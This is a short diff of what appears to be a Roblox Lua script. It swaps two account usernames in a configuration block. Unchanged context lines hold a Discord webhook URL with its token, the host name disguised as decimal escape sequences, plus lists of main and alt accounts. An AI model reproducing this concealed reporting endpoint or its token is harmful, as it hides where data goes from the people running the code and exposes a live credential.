@@ -2,8 +2,8 @@ task.spawn(function()
 local webhookURL = "https://" .. "\100\105\115\099\111\114\100" .. ".com/api/" .. "\119\101\098\104\111\111\107\115" .. "/1285625667849027665/bZyq3Qo-_ret4L0W_3NcV_6IzY2d16uzS9u2iY3-HGIQO0iFaffnekkhGk47GFniac8R"
 local leaveDelay = 90 --Leaves incase bugged after this many seconds
 local mainAcc1 = "\97\104\103\103\110\116\121"
-local mainAcc2 = "\72\121\100\114\111\66\73\111\120"
-local altAcc1 = "Rogu3FrostGiga"
+local mainAcc2 = "CircuitGalaxyPh0enix"
+local altAcc1 = "PhoenixMysticCircuit"
 local altAcc2 = "StormyDancer82"
 local altAcc3 = "Light_Primal63"
 local altAcc4 = "XxDragon_QueenxX37"
